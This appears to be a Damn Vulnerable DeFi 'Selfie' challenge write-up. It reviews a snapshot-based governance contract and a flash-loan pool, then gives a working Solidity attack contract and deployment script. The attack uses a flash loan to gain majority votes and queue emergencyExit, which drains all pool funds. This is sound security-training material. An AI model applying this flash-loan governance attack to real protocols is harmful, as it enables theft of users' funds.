<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/6.png">

# Target Contract Review

Given contracts.

**ISimpleGovernance.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleGovernance {
    struct GovernanceAction {
        uint128 value;
        uint64 proposedAt;
        uint64 executedAt;
        address target;
        bytes data;
    }

    error NotEnoughVotes(address who);
    error CannotExecute(uint256 actionId);
    error InvalidTarget();
    error TargetMustHaveCode();
    error ActionFailed(uint256 actionId);

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);
    function getActionDelay() external view returns (uint256 delay);
    function getGovernanceToken() external view returns (address token);
    function getAction(uint256 actionId) external view returns (GovernanceAction memory action);
    function getActionCounter() external view returns (uint256);
}
```



**SimpleGovernance.sol**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol"
;
/**
 * @title SimpleGovernance
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SimpleGovernance is ISimpleGovernance {

    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;
    DamnValuableTokenSnapshot private _governanceToken;
    uint256 private _actionCounter;
    mapping(uint256 => GovernanceAction) private _actions;

    constructor(address governanceToken) {
        _governanceToken = DamnValuableTokenSnapshot(governanceToken);
        _actionCounter = 1;
    }

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender))
            revert NotEnoughVotes(msg.sender);

        if (target == address(this))
            revert InvalidTarget();
        
        if (data.length > 0 && target.code.length == 0)
            revert TargetMustHaveCode();

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked { _actionCounter++; }

        emit ActionQueued(actionId, msg.sender);
    }

    function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if(!_canBeExecuted(actionId))
            revert CannotExecute(actionId);

        GovernanceAction storage actionToExecute = _actions[actionId];
        actionToExecute.executedAt = uint64(block.timestamp);

        emit ActionExecuted(actionId, msg.sender);

        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
        if (!success) {
            if (returndata.length > 0) {
                assembly {
                    revert(add(0x20, returndata), mload(returndata))
                }
            } else {
                revert ActionFailed(actionId);
            }
        }

        return returndata;
    }

    function getActionDelay() external pure returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }

    function getGovernanceToken() external view returns (address) {
        return address(_governanceToken);
    }

    function getAction(uint256 actionId) external view returns (GovernanceAction memory) {
        return _actions[actionId];
    }

    function getActionCounter() external view returns (uint256) {
        return _actionCounter;
    }

    /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = _actions[actionId];
        
        if (actionToExecute.proposedAt == 0) // early exit
            return false;

        uint64 timeDelta;
        unchecked {
            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
        }

        return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
    }

    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
}
```

The SimpleGovernance contract is a basic implementation of a governance system for decentralized decision-making. It allows token holders to propose and execute actions based on the number of tokens they hold.

The constructor takes the address of the governance token and initializes the state variables.

`queueAction()` : Allows token holders to propose a new action. It checks if the sender has enough votes, validates the target address and data, assigns a new action ID, and stores the action in the `_actions` mapping. It emits the `ActionQueued` event.

`executeAction()` : Allows the execution of a proposed action. It checks if the action can be executed based on the execution conditions, updates the executed timestamp, and calls the target contract with the provided value and data. If the execution fails, it reverts the transaction with an appropriate error message. It emits the `ActionExecuted` event.

`getActionDelay()` : Returns the delay period required before an action can be executed.

`getGovernanceToken()` : Returns the address of the governance token.

`getAction()` : Returns the details of a specific action based on the action ID.

`getActionCounter()` : Returns the current value of the action counter.

`_canBeExecuted()` :  Checks if an action can be executed based on the execution conditions (never executed before and enough time has passed since it was proposed).

`_hasEnoughVotes()` : Checks if the sender has enough votes to propose an action based on their token balance compared to half of the total token supply.


**SelfiePool.sol**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {

    ERC20Snapshot public immutable token;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance))
            revert CallerNotGovernance();
        _;
    }

    constructor(address _token, address _governance) {
        token = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token)
            return token.balanceOf(address(this));
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token)
            revert UnsupportedCurrency();
        return 0;
    }

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external nonReentrant returns (bool) {
        if (_token != address(token))
            revert UnsupportedCurrency();

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)
            revert CallbackFailed();

        if (!token.transferFrom(address(_receiver), address(this), _amount))
            revert RepayFailed();
        
        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}
```

The SelfiePool contract is a smart contract that implements a flash loan mechanism. It allows users to borrow funds from the pool temporarily and repay the loan within the same transaction.

The contract has a constructor that takes the addresses of the token and governance contracts as parameters. The token contract is an ERC20Snapshot token, and the governance contract is a contract responsible for governing the SelfiePool.

`maxFlashLoan()` : This function returns the maximum amount of tokens that can be borrowed from the pool. If the token address passed as a parameter matches the token held by the pool, it returns the balance of the pool. Otherwise, it returns 0.

`flashFee()` : This function returns the fee charged for a flash loan. Since this contract does not charge any fees, it always returns 0. 

`flashLoan()` : This function allows users to borrow funds from the pool. It transfers the specified amount of tokens to the borrower (_receiver) and calls the onFlashLoan function of the borrower contract. If the borrower contract returns the CALLBACK_SUCCESS value, indicating a successful loan, the contract attempts to transfer the borrowed amount back from the borrower. If the transfer fails, it reverts the transaction.

`emergencyExit()` : This function allows the governance contract to drain all the funds from the pool to a specified receiver address. It transfers the entire balance of the pool to the receiver.




Challenge's message:

> A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.
What could go wrong, right ?
You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.

# Subverting


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function snapshot() external returns (uint256);
    function getTotalSupplyAtLastSnapshot() external view returns (uint256);
}

interface ISelfiePool {
    function flashLoan(address _receiver, address _token, uint256 _amount, bytes calldata _data) external returns (bool);
}

interface IGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256);
}

contract AttackSelfie {
    IToken token;
    IGovernance governance;
    ISelfiePool pool;
    uint256 public id;
    address attacker;

    constructor(address _token, address _governance, address _pool) {
        attacker = msg.sender;
        token = IToken(_token);
        governance = IGovernance(_governance);
        pool = ISelfiePool(_pool);
    }


    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        // Take a new snapshot where we have >50% of the governance token
        token.snapshot();

        // Queue a proposal to call emergencyExit on SelfiePool **as the governance token**
        id = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", attacker));

        // SelfiePool will do .transferFrom to return the flash loan
        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        // Anyone can call a token snapshot. Call one now to determine the 50% threshold
        token.snapshot();

        // Acquire over 50% of the governance token as of the last snapshot, allowing us to queue a proposal
        uint256 loanAmount = token.getTotalSupplyAtLastSnapshot() / 2 + 1;
        pool.flashLoan(address(this), address(token), loanAmount, hex'');
    }
}
```

```js
const AttackFactory = await ethers.getContractFactory('AttackSelfie', deployer);
attack = await AttackFactory.connect(player).deploy(token.address, governance.address, pool.address);
await attack.attack();
await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]); // 2 days
await governance.executeAction(await attack.id());
```

```powershell
[Challenge] Selfie
    ✔ Execution (128ms)


  1 passing (2s)
```

